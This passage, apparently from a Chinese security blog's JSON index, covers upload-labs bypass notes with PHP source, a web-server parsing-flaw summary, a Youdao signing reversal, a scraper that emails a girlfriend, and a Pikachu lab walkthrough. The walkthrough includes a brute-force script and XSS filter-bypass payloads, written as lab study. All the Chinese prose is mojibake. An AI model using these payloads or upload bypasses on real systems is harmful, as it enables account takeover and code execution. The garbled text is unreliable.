$_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        }else{\n            $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n- ä¸Šä¼ \né»‘åå•,ä¼šå¯¹æ–‡ä»¶åé‡å‘½å,åŒå†™,å¤§å°å†™éƒ½å¯ä»¥ç»•è¿‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151405930.png?token=ARYCSATJRWMONW5XYBJMCCTCQCMIA)\n  \n# pass-21\n\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //æ£€æŸ¥MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\";\n    }else{\n        //æ£€æŸ¥æ–‡ä»¶å\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\";\n                $is_upload = true;\n            } else {\n                $msg = \"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\";\n            }\n        }\n    }\n}else{\n    $msg = \"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼\";\n}\n```\n\n- ä¸Šä¼ \næ£€æŸ¥MIMEå’Œç™½åå•,ä»¥`.`åˆ‡å‰²ä¸ºæ•°ç»„,å–æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ æ¥æ ¡éªŒæ˜¯å¦åœ¨ç™½åå•å†…,å†å–æ•°ç»„æ•°-1æ¥é‡å‘½ååç¼€\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151406269.png?token=ARYCSATYTCCNBOWEHY3CJF3CQCMI4)","tags":["webæ¼æ´","upload"],"categories":["é¶åœº"]},{"title":"åˆ©ç”¨çˆ¬è™«å®šæ—¶ç»™å¥³å‹å‘é€æš–å¿ƒé‚®ä»¶","url":"/2022/05/11/åˆ©ç”¨çˆ¬è™«å®šæ—¶ç»™å¥³å‹å‘é€æš–å¿ƒé‚®ä»¶/","content":"\nçˆ¬å–å¢¨è¿¹å¤©æ°”,åœŸå‘³æƒ…è¯,ONEæ¯æ—¥å›¾ç‰‡å®šæ—¶å‘é€é‚®ä»¶\n\n\n```python\n\nimport smtplib\nimport time\nfrom email.mime.text import MIMEText\nimport requests\nfrom lxml import etree\nimport datetime\nfrom fake_useragent import UserAgent\n\nsender_maile = ''  # å‘ä»¶äººåœ°å€\nsender_pass = ''  # é‚®ä»¶æˆæƒç \nboy_name = ''  # å‘ä»¶äººå§“å\ngirl_name = ''  # æ”¶ä»¶äººå§“å\nmaile_obj = smtplib.SMTP_SSL('smtp.qq.com', 465)  # å‘é€çš„æœåŠ¡å™¨\nreceiver_mail = ''  # æ”¶ä»¶äººé‚®ç®±\nspecial_day = ''  # çºªå¿µæ—¥\nprovince = ''  # çœä»½ å¢¨è¿¹å¤©æ°”å®˜ç½‘æŸ¥çœ‹ ç¤ºä¾‹province = 'guangxi'\ncity = ''  # åŸå¸‚ ç¤ºä¾‹city = 'jiangnan-district' \ntitle = 's'  # é‚®ä»¶ä¸»é¢˜\nua = UserAgent()\nheader = {\n    'Referer': 'https://tianqi.moji.com/weather/china/guangxi', # æ ¹æ®åŸå¸‚ä¿®æ”¹\n    'User-Agent': ua.random\n}\n\nsession = requests.session()\n\n\n# è·å–çºªå¿µæ—¥è·ä»Šå¤šå°‘å¤©\ndef get_day():\n    d1 = datetime.datetime.strptime(special_day, '%Y-%m-%d')\n    d2 = datetime.datetime.strptime(datetime.datetime.now().strftime('%Y-%m-%d'), '%Y-%m-%d')\n    delta = d2 - d1\n    return delta.days\n\n\n# è·å–æ¯æ—¥åœŸå‘³æƒ…è¯\ndef get_chp():\n    url =  \"https://api.lovelive.tools/api/SweetNothings\"\n    resp = requests.get(url=url)\n    return resp.text\n\n\n# è·å–æé†’\ndef get_weathertip():\n    try:\n        url = f'https://tianqi.moji.com/weather/china/{province}/{city}'\n        resp = session.get(url=url, headers=header, verify=False)\n        html = etree.HTML(resp.text)\n        em = html.xpath('/html/body/div[4]/div[1]/div[4]/em/text()')[0]\n        return em\n    except:\n        return False\n\n\n# è·å–æ¯æ—¥å¤©æ°”\ndef get_weather():\n    try:\n        url = f'https://tianqi.moji.com/weather/china/{province}/{city}'\n        resp = session.get(url=url, headers=header,  verify=False)\n        html = ''\n        htmls = etree.HTML(resp.text)\n        ul = htmls.xpath('/html/body/div[5]/div[1]/div[1]/ul')\n        for lis in ul:\n            # è·å–æ—¥æœŸ\n            day = lis.xpath('./li[1]/a/text()')[0]\n            # è·å–å¤©æ°”å›¾æ ‡\n            src = lis.xpath('./li[2]/span/img/@src')[0]\n            # è·å–å¤©æ°”çŠ¶å†µ\n            weather = lis.xpath('./li[2]/span/img/@alt')[0]\n            # è·å–æ¸©åº¦\n            temperature = lis.xpath('./li[3]/text()')[0]\n            # è·å–ç©ºæ°”è´¨é‡\n            air = lis.xpath('./li[5]/strong/text()')[0].strip()\n            # è·å–ç©ºæ°”è´¨é‡å¯¹åº”çš„å­—ä½“é¢œè‰²\n            color = str(lis.xpath('./li[5]/strong/@class')[0])\n            # åˆ¤æ–­å­—ä½“é¢œè‰²\n            if color == 'level_1':\n                color = '#8fc31f'\n            elif color == 'level_2':\n                color = '#d7af0e'\n            elif color == 'level_3':\n                color = '#f39800'\n            elif color == 'level_4':\n                color = '#e2361a'\n            elif color == 'level_5':\n                color = '#5f52a0'\n            elif color == 'level_6':\n                color = '#631541'\n            html += \"\"\"<div style=\"display: flex;margin-top:5px;height: 30px;line-height: 30px;justify-content: space-around;align-items: center;\">\n            <span style=\"width:15%%; text-align:center;\">%s</span>\n            <div style=\"width:10%%; text-align:center;\">\n                <img style=\"height:26px;vertical-align:middle;\" src='%s' alt=\"\">\n            </div>\n            <span style=\"width:25%%; text-align:center;\">%s</span>\n            <div style=\"width:35%%; \">\n                <span style=\"display:inline-block;padding:0 8px;line-height:25px;color:%s; border-radius:15px; text-align:center;\">%s</span>\n            </div>\n            </div>\n            \"\"\" % (day, src, temperature, color, air)\n        return html\n    except:\n        return False\n\n\n# è·å–å›¾ç‰‡\ndef get_image():\n    url = \"http://wufazhuce.com/\"\n    resp = requests.get(url=url)\n    html = etree.HTML(resp.text)\n    img_url = html.xpath('//*[@id=\"carousel-one\"]/div/div[1]/a/img/@src')[0]\n    return img_url\n\n\n# è·å–å½“å¤©æ—¥æœŸ\ndef get_today():\n    i = datetime.datetime.now()\n    date = \"%s/%s/%s\" % (i.year, i.month, i.day)\n    return date\n\n\nmail_content = \"\"\"<!DOCTYPE html>\n                <html>\n\n                <head>\n                    <title>\n                    </title>\n                    <meta name=\"viewport\" content=\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n                    <meta charset=\"UTF-8\">\n                </head>\n\n                <body style=\"margin:0;padding:0;\">\n                    <div style=\"width:100%; margin: 40px auto;font-size:20px; color:#5f5e5e;text-align:center\">\n                        <span>ä»Šå¤©æ˜¯æˆ‘ä»¬åœ¨ä¸€èµ·çš„ç¬¬</span>\n                        <span style=\"font-size:24px;color:rgb(221, 73, 73)\"  >{0}</span>\n                        <span>å¤©</span>\n                    </div>\n                    <div style=\"width:100%; margin: 0 auto;color:#5f5e5e;text-align:center\">\n                        <span style=\"display:block;color:#676767;font-size:20px\">{2}</span>\n                        <br>\n                        <span style=\"display:block;color:#676767;font-size:20px\">{1}</span>\n                        <span style=\"display:block;margin-top:15px;color:#676767;font-size:15px\">è¿‘æœŸå¤©æ°”é¢„æŠ¥</span>\n                {3}\n                    </div>\n                    <div style=\"text-align:center;margin:35px 0;\">\n                            <span style=\"display:block;margin-top:55px;color:#676767;font-size:15px\">{4} â¤ï¸ {5}</span>\n                            <span style=\"display:block;margin-top:25px;font-size:22px; color:#9d9d9d; \">{6}</span>\n                             <img src='{7}' style=\"width:100%;margin-top:10px;\"  alt=\"\">\n                    </div>\n                </body>\n\n                </html>\"\"\".format(str(get_day()), get_weathertip(), get_chp(), get_weather(), boy_name, girl_name,\n                                  get_today(), get_image())\n\n\n# å‘é€é‚®ä»¶\ndef send_mail():\n    try:\n        maile_obj.login(sender_maile, sender_pass)\n        # ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å‘ä»¶äººé‚®ç®±è´¦å·,æ”¶ä»¶äººè´¦å·,å‘é€çš„é‚®ä»¶å†…å®¹\n        msg = MIMEText(mail_content, _subtype='html', _charset='utf-8')\n        msg['Subject'] = title\n        msg['From'] = \"å‘é€äººåç§°\"\n        msg['To'] = \"æ¥æ”¶äººåç§°\"\n        maile_obj.sendmail(sender_maile, receiver_mail, msg.as_string())\n        maile_obj.quit()\n        return True\n    except smtplib.SMTPException as e:\n        return False\n\n\nif __name__ == '__main__':\n    send_mail()\n    print('å‘é€æˆåŠŸ!')\n    theTime = datetime.datetime.now()\n    print(theTime)\n\n\n```\n\næ•ˆæœ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151434500.png?token=ARYCSAQPCUTWVPSDZCCU65LCQCPT2)","tags":["requests"],"categories":["çˆ¬è™«"]},{"title":"æœ‰é“ç¿»è¯‘é€†å‘","url":"/2022/05/07/æœ‰é“ç¿»è¯‘é€†å‘/","content":"\njsæºç \n```js\ndefine(\"newweb/common/service\", [\"./utils\", \"./md5\", \"./jquery-1.7\"], function(e, t) {\n    var n = e(\"./jquery-1.7\");\n    e(\"./utils\");\n    e(\"./md5\");\n    var r = function (e) {\n        var t = n.md5(navigator.appVersion)\n            , r = \"\" + (new Date).getTime()\n            , i = r + parseInt(10 * Math.random(), 10);\n        return {\n            ts: r,\n            bv: t,\n            salt: i,\n            sign: n.md5(\"fanyideskweb\" + e + i + \"Ygy_4c=r#e#4EX^NUGUc5\")\n        }\n};\n// e = ç¿»è¯‘çš„å­—ç¬¦ä¸², i = å­—ç¬¦ä¸²å½¢å¼çš„jsæ—¶é—´æˆ³+ä¸€ä½æ•´æ•°\n```\n\npythonå®ç°ä»£ç \n```python\n\nimport time\nimport hashlib\nimport requests\n\ndef get_fanyi(word):\n    # 13ä½æ—¶é—´æˆ³\n    lts = str(int(time.time() * 1000))\n    # æ—¶é—´æˆ³+ä¸€ä¸ªéšæœºæ•´æ•°\n    salt = str(int(time.time() * 10000))\n    # å†™æ­»çš„ä¸¤ä¸ªå‚æ•°+ç¿»è¯‘çš„å­—ç¬¦+salt\n    sign = \"fanyideskweb\" + word + salt + \"Y2FYu%TNSbMCxc3t2u^XT\"\n    # md5 åŠ å¯†å­—ç¬¦\n    sign = hashlib.md5(sign.encode()).hexdigest()\n\n    data = {\"i\": word,\n            \"from\": \"AUTO\",\n            \"to\": \"AUTO\",\n            \"smartresult\": \"dict\",\n            \"client\": \"fanyideskweb\",\n            # æ—¶é—´æˆ³14ä½\n            \"salt\": salt,\n            # åŠ å¯†çš„æ•°æ®\n            \"sign\": sign,\n            # æ—¶é—´æˆ³13ä½\n            \"lts\": lts,\n            \"bv\": 'd771cbe0c376715add7059261c9e06bd',\n            \"doctype\": \"json\",\n            \"version\": \"2.1\",\n            \"keyfrom\": \"fanyi.web\",\n            \"action\": \"FY_BY_REALTlME\"\n            }\n    url = 'https://fanyi.youdao.com/translate_o?smartresult=dict&smartresult=rule'\n    header = {\n        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',\n        'Referer': 'https://fanyi.youdao.com/',\n        'cookie': 'OUTFOX_SEARCH_USER_ID=-1711366876@10.108.160.105; OUTFOX_SEARCH_USER_ID_NCOO=528854206.9578509; '\n                  'fanyi-ad-closed=0; JSESSIONID=aaab35aMiB_2j8wyyH0-x; fanyi-ad-id=305426; '\n                  '___rl__test__cookies=1649078361368 '\n    }\n    resp = requests.post(url=url, headers=header, data=data)\n    print(resp.json()['translateResult'][0][0]['tgt'])\n\n\nif __name__ == '__main__':\n    get_fanyi('dog')\n\n```","tags":["çˆ¬è™«","é€†å‘"],"categories":["jsé€†å‘"]},{"title":"ä¸­é—´ä»¶è§£ææ¼æ´æ€»ç»“","url":"/2022/05/01/ä¸­é—´ä»¶è§£ææ¼æ´æ€»ç»“/","content":"# æœåŠ¡å™¨è§£ææ¼æ´\n\n    æœåŠ¡å™¨è§£ææ¼æ´ä¸€èˆ¬æ˜¯æœåŠ¡å™¨è‡ªèº«æˆ–æ‰©å±•ç»„ä»¶å¸¦æ¥çš„æ¼æ´ï¼Œé…åˆæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´å°±ä¼šäº§ç”Ÿå¾ˆå¤§çš„å±å®³ã€‚\n    æˆ‘ä»¬è¿™é‡Œæ•´ç†å¸¸è§çš„æœåŠ¡å™¨apacheã€IISã€nginxçš„è§£ææ¼æ´ã€‚\n\n# apache\n\n- ä¸€ã€ä¸å¯è¯†åˆ«è§£æ\n\napacheè§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚\næ¯”å¦‚ test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠwooyun.php.owf.rarè§£ææˆphpã€‚\napacheç‰ˆæœ¬åœ¨ä»¥ä¸‹èŒƒå›´å†…\nApache 2.0.x <= 2.0.59 Apache 2.2.x <= 2.2.17 Apache 2.2.2 <= 2.2.8 éƒ½å¯ä»¥é€šè¿‡ä¸Šä¼ xxx.php.raræˆ–xxx.php+ä»»æ„æ— æ³•è§£æåç¼€è§£æä¸ºphpã€‚\n- äºŒã€é…ç½®é—®é¢˜\n\n1.å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚\n2.å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚\n- ä¸‰ã€ç½•è§åç¼€\n\nApacheé…ç½®æ–‡ä»¶ä¸­ä¼šæœ‰.+.ph(p[345]?|t|tml)æ­¤ç±»çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¢«å½“phpç¨‹åºæ‰§è¡Œçš„æ–‡ä»¶åè¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ã€‚ä¹Ÿå°±æ˜¯è¯´php3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtmlç­‰æ–‡ä»¶åç¼€ä¹Ÿæ˜¯å¯ä»¥è¢«å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æçš„ã€‚\n- å››ã€åç¼€åŒ…å«æ¢è¡Œç¬¦\\x0A\n\nCVE-2017-15715ï¼šApache 2.4.0-2.4.29ä¸­ï¼Œä¸Šä¼ ä¸€ä¸ªåç¼€æœ«å°¾åŒ…å«æ¢è¡Œç¬¦çš„æ–‡ä»¶ï¼Œæ¥ç»•è¿‡FilesMatchã€‚ç»•è¿‡FilesMatchä¸ä¸€å®šèƒ½è¢«PHPè§£æã€‚\n# IIS\n\n- ä¸€ã€ç›®å½•è§£æ\n\nåœ¨IIS-6.0çš„ç‰ˆæœ¬ï¼Œåœ¨.aspæˆ–.asaæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰ç±»å‹åç¼€æ–‡ä»¶å…¨éƒ¨è§£æä¸º.aspæ–‡ä»¶ã€‚\nå­˜åœ¨æ•°æ®åº“å¤‡ä»½åŠŸèƒ½çš„ç³»ç»Ÿå¹¶ä¸”å¤‡ä»½è·¯å¾„å¯æ§çš„è¯ç»å¸¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚\n- äºŒã€æ–‡ä»¶è§£æ\n\nåœ¨IIS-6.0çš„ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;åé¢çš„å†…å®¹ï¼Œæ‰€ä»¥xxx.asp;.jpgä¼šè¢«è§£ææˆxxx.aspã€‚\n- ä¸‰ã€å…¶ä»–è§£æç±»å‹\n\nåœ¨IIS6.0çš„ç‰ˆæœ¬ï¼Œå¦‚ä¸‹å‡ ç§æ–‡ä»¶ç±»å‹ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚\nxxx.asa xxx.cer xxx.cdx\n- å››ã€php-cgiæ¼æ´\n\nåœ¨IIS-7.0å’ŒIIS-7.5çš„ç‰ˆæœ¬ï¼Œåœ¨phpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯cgi.fix_pathinfoï¼Œç„¶åä¸Šä¼ ä¸€ä¸ª1.jpgçš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ã€‚ç„¶åç”¨èœåˆ€è®¿é—®1.jpg/.phpå³å¯è¿æ¥ä¸€å¥è¯æœ¨é©¬ã€‚\n# nginx\n\n- ä¸€ã€ä½ç‰ˆæœ¬nginx\nç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´ï¼šnginx 0.5.xã€nginx 0.6.xã€Nginx 0.7-0.7.65ã€Nginx 0.8-0.8.37ä¸­å¯ä»¥é€šè¿‡åœ¨ä»»æ„æ–‡ä»¶ååé¢å¢åŠ %00.phpè§£æä¸ºphpï¼Œå¦‚1.jpg%00.php\n\n- äºŒã€php-cgiæ¼æ´\nå’ŒIISçš„ç¬¬å››ç‚¹ç›¸åŒï¼Œåœ¨phpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinfoï¼Œå¯¼è‡´å›¾ç‰‡é©¬1.jpgå¯ä»¥é€šè¿‡è®¿é—®1.jpg/.phpã€1.jpg%00.phpè§£ææˆphpæ–‡ä»¶\n  \n\n# windowsè§£ææ¼æ´\nWindowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åä¸èƒ½ä»¥ç©ºæ ¼æˆ–.å¼€å¤´ï¼Œä¹Ÿä¸èƒ½ä»¥ç©ºæ ¼æˆ–.ç»“å°¾ã€‚\nå½“æŠŠä¸€ä¸ªæ–‡ä»¶å‘½åä¸ºä»¥ç©ºæ ¼æˆ–.å¼€å¤´æˆ–ç»“å°¾æ—¶ï¼Œä¼šè‡ªåŠ¨åœ°å»æ‰å¼€å¤´å’Œç»“å°¾å¤„çš„ç©ºæ ¼å’Œ.ã€‚åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œä¹Ÿå¯èƒ½é€ æˆæ–‡ä»¶è§£ææ¼æ´\n\n# åº”å¯¹\n\n1. å¯¹äºphp-cgiæ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œå°†cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0\n2. ä½¿ç”¨ç™½åå•åŒ¹é…æ–‡ä»¶åç¼€å\n3. å¯ä»¥å¯¹ä¸Šä¼ åçš„æ–‡ä»¶å›ºå®šåç¼€ï¼Œå¹¶å¯¹ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œé‡å‘½å\nä½œè€…ï¼šLeticia's Blog ï¼Œè¯¦æƒ…ç‚¹å‡»é˜…è¯»[åŸæ–‡](https://uuzdaisuki.com/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)ã€‚","tags":["è§£ææ¼æ´"],"categories":["ç¬”è®°"]},{"title":"pikachuæ¼æ´é¶åœºé€šå…³","url":"/2022/04/28/pikachuæ¼æ´é¶åœºé€šå…³/","content":"# æš´åŠ›ç ´è§£\n\n## åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£\næŠ“å–ç™»å½•æ•°æ®åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291529117.png)\n\nå‘é€åˆ°intruderæ¨¡å—,è®¾ç½®çˆ†ç ´çš„å‚æ•°\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291531603.png)\n\nè®¾ç½®payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291532226.png)\n\nå¼€å§‹çˆ†ç ´,ä»è¿”å›æ•°æ®åŒ…é•¿åº¦åˆ¤æ–­çˆ†ç ´ç»“æœ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291534944.png)\n\n\n## ç»•è¿‡éªŒè¯ç (Server)\næŠ“åŒ…åˆ†æ,å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç ,éªŒè¯ç éƒ½æ­£ç¡®ä¼šå›æ˜¾success\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291537345.png)\n\næ›¿æ¢ä¸€ä¸ªä¸å­˜åœ¨çš„è´¦å·ç»§ç»­å‘åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291539745.png)\n\nä»…æç¤ºè´¦å·ä¸å­˜åœ¨,è¯´æ˜éªŒè¯ç é•¿æœŸæœ‰æ•ˆ,å¯ä»¥çˆ†ç ´,çˆ†ç ´è¿‡ç¨‹å’Œä¸Šå…³ä¸€æ ·\n\n## ç»•è¿‡éªŒè¯ç (client\næŠ“åŒ…åˆ†æ,åˆšå¼€å§‹è¾“é”™äº†å‡ æ¬¡,å‘ç°æ ¡éªŒæ˜¯åœ¨å‰ç«¯\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291543457.png)\nä¸ç”¨è¯´äº†,ç›´æ¥çˆ†ç ´\n\n## tokené˜²çˆ†ç ´\næŠ“åŒ…åˆ†æ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291545789.png)\n\néšæœºç”Ÿæˆtokenæ¥æ ¡éªŒæ•°æ®åŒ…çš„å”¯ä¸€æ€§,ç†è®ºä¸Šæ˜¯æ— æ³•é‡å¤å‘åŒ…çš„,ä¹Ÿå°±æ— æ³•è¿›è¡Œçˆ†ç ´,ä½†æ˜¯è¿™é‡Œtokenå›æ˜¾åœ¨äº†å‰ç«¯\nåœ¨åˆ†ææ•°æ®åŒ…çš„æ—¶å€™,å¯ä»¥è§‚å¯Ÿä¸€äº›ç‰¹å®šçš„å˜é‡å,å¾ˆå¤škeyéƒ½è—åœ¨ç½‘é¡µæºç é‡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205291546774.png)\n\nè‡ªåŠ¨è„šæœ¬\nå®ç°æŠ“å–key,å¹¶è¿›è¡Œçˆ†ç ´\n```python\nimport requests\nfrom lxml import etree\n\n# å¯†ç å­—å…¸\npass_dict = ['123', '456', '123456']\nsession = requests.Session()\nfor pwd in pass_dict:\n    # æŠ“å–token\n    resp = session.get(url='http://10.20.146.195:8080/vul/burteforce/bf_token.php')\n    html = etree.HTML(resp.text)\n    token = html.xpath('//*[@id=\"bf_client\"]/input/@value')[0]\n    # æ„é€ è¯·æ±‚å‚æ•°\n    data = {\n        'username': 'admin',\n        'password': pwd,\n        'token': token,\n        'submit': 'Login'\n    }\n    resp = session.post('http://10.20.146.195:8080/vul/burteforce/bf_token.php', data=data)\n    # åˆ¤æ–­ç»“æœ\n    if \"success\" in resp.text:\n        print('çˆ†ç ´æˆåŠŸ', pwd)\n```\n\n\n# xss\n    Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™\"CSS\"å†²çªï¼Œæ•…åˆç§°XSSã€‚ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š\n        1.åå°„æ€§XSS;\n        2.å­˜å‚¨å‹XSS;\n        3.DOMå‹XSS;\n        XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚\n        XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚\n        å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚\n        å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:\n          è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;\n          è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;\n\n## åå°„å‹XSS(GET)\nå¯¹è¾“å…¥é•¿åº¦æœ‰é™åˆ¶,ç›´æ¥åœ¨urlé‡Œæ’å…¥jsä»£ç \n\n- payload\n    ```js\n    <script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221450440.png)\n\n\n\n## åå°„å‹XSS(POST) \næŠ“åŒ…æ’å…¥js\n\n- payload\n    ```js\n    <script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221506374.png)\n\n\n## å­˜å‚¨æ€§XSS\nå’Œä¸Šå…³ä¸€æ ·,åŒºåˆ«å°±æ˜¯è¿™ä¸ªæ˜¯é•¿ä¹…å­˜åœ¨çš„\n\n- payload\n\n```js\n<script>alert(1)</script>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221510986.png)\n\n\n\n## DOM-XSS\néœ€è¦å…ˆå°†å‰é¢çš„aæ ‡ç­¾é—­åˆ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221516245.png)\n\n- payload\n    ```js\n    ' onclike='alert(1)'\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221522590.png)\n\n\n## DOM-XSS-X\nè¾“å…¥æ¡†è¾“å…¥çš„å†…å®¹ä¼šè¢«æ‹¼æ¥ä¸ºurl\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221525149.png)\n\n- payload\n\n```js\n'><img src=\"#\" onmouseover=\"alert('xss')\">\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221532373.png)\n\n\n\n## XSSç›²æ‰“\næ— å›æ˜¾,æœ‰è¾“å…¥æ¡†å°±æ’å…¥js\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221536427.png)\n\nåˆ°åå°æŸ¥çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221536452.png)\n\n\n\n## XSSä¹‹è¿‡æ»¤\nå¤§å°å†™ç»•è¿‡\n\n- payload\n```js\n<SCRipt>alert(1)</SCRIPt>\n```\n\n## XSSä¹‹htmlspecialchars\n<>è¢«è¿‡æ»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221547770.png)\n\n- payload\n```js\n' onclick='alert(1)'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221550582.png)\n\n\n\n## 